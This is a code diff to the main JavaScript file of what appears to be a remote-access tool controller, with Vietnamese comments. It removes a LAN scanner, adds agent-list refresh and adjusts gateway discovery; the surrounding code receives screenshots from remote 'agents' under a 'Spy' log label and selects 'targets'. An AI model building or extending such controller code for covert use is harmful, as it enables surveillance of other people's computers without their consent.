@@ -1,7 +1,6 @@
 import { CONFIG } from './modules/config.js';
 import { Gateway } from './modules/gateway.js';
 import { GatewayDiscovery } from './modules/discovery.js';
-import { LanScanner } from './modules/scanner.js';
 
 const appState = {
     isConnected: false,
@@ -100,6 +99,15 @@ const gateway = new Gateway({
             gateway.setTarget('ALL');
         }
         ui.updateAgentList(agentList);
+        
+        // Trigger render agent list nếu overlay đang mở
+        if (window.fetchAndRenderAgents && typeof window.fetchAndRenderAgents === 'function') {
+            // Reset về page 1 khi có update mới
+            if (window.resetAgentListPage && typeof window.resetAgentListPage === 'function') {
+                window.resetAgentListPage();
+            }
+            window.fetchAndRenderAgents();
+        }
     },
     onScreenshot: (base64Data, agentId) => {
         ui.log("Spy", `Nhận ảnh màn hình từ ${agentId}`);
@@ -138,7 +146,8 @@ const gateway = new Gateway({
 });
 
 window.ui = ui;
-window.gateway = gateway; 
+window.gateway = gateway;
+window.appState = appState; 
 
 window.help = () => {
     console.clear();
@@ -147,8 +156,7 @@ window.help = () => {
     console.group("%c1. KẾT NỐI & QUẢN LÝ", "color: #3b82f6");
     console.log("getAgentList()    - fetch agent list")
     console.log("auth()            - Đăng nhập (Bắt buộc sau khi connect)");
-    console.log("discover()        - Tự động tìm Gateway qua mDNS/Bonjour (rat-gateway.local)");
-    console.log("scan()            - Quét mạng LAN tìm IP Server (TCP scan)");
+    console.log("discover()        - Tự động tìm Gateway (default gateways → mDNS)");
     console.log("setTarget('ID')   - Chọn mục tiêu cụ thể (hoặc 'ALL')");
     console.log("whoami()          - Lấy tên máy của mục tiêu");
     console.groupEnd();
@@ -191,15 +199,15 @@ async function autoConnect() {
     }
     
     autoConnectState.isConnecting = true;
-    ui.info("[Auto] Đang tự động tìm Gateway trên mạng LAN (Discovery)...");
+    ui.info("[Auto] Đang tự động tìm Gateway...");
     
     try {
         let found = false;
+        
         const discoveryPromise = discovery.discover((ip, port) => {
             found = true;
-            console.log(`[Auto] Discovery callback triggered: ip=${ip}, port=${port}`);
-            ui.log("Auto", `Tìm thấy Gateway trên LAN: ${ip}:${port}`);
-            console.log(`[Auto] Calling gateway.connect('${ip}', ${port})...`);
+            console.log(`[Auto] Discovery callback: ip=${ip}, port=${port}`);
+            ui.log("Auto", `Tìm thấy Gateway: ${ip}:${port}`);
             gateway.connect(ip, port);
         }, (progress) => {
             if (progress) {
@@ -207,14 +215,14 @@ async function autoConnect() {
             }
         });
         
-        const timeoutPromise = new Promise(resolve => setTimeout(() => resolve(false), 12000));
+        const timeoutPromise = new Promise(resolve => setTimeout(() => resolve(false), 15000));
         const result = await Promise.race([discoveryPromise, timeoutPromise]);
         
         if (found || result) {
             return;
         }
         
-        ui.warn("Auto", "Không tìm thấy Gateway trên LAN. Đảm bảo Gateway đang chạy trên mạng.");
+        ui.warn("Auto", "Không tìm thấy Gateway. Đảm bảo Gateway đang chạy và Bonjour/mDNS đã được cài đặt.");
         autoConnectState.hasTriedDiscovery = true;
         autoConnectState.isConnecting = false;
     } catch (error) {
@@ -241,26 +249,21 @@ window.auth = () => {
     gateway.authenticate();
 };
 
-const scanner = new LanScanner();
 const discovery = new GatewayDiscovery();
 
-window.scan = () => {
-    ui.info("[Main] Đang quét mạng (192.168.1.x)...");
-    scanner.scan("192.168.1.", (foundIp) => {
-        ui.log("Scanner", `Tìm thấy server tại: ${foundIp}`);
-        gateway.connect(foundIp);
-        setTimeout(() => gateway.authenticate(), 500);
-    });
-};
+// Note: LAN Scanner removed per plan requirements
+// Use discover() or default gateways instead
 
 window.discover = () => {
-    ui.info("[Discovery] Đang tìm Gateway trên mạng LAN...");
+    ui.info("[Discovery] Đang tìm Gateway...");
     discovery.discover((ip, port) => {
         ui.log("Discovery", `Tìm thấy Gateway tại: ${ip}:${port}`);
         gateway.connect(ip, port);
         setTimeout(() => gateway.authenticate(), 500);
     }, (progress) => {
-        ui.info(`[Discovery] ${progress}`);
+        if (progress) {
+            ui.info(`[Discovery] ${progress}`);
+        }
     });
 };
 
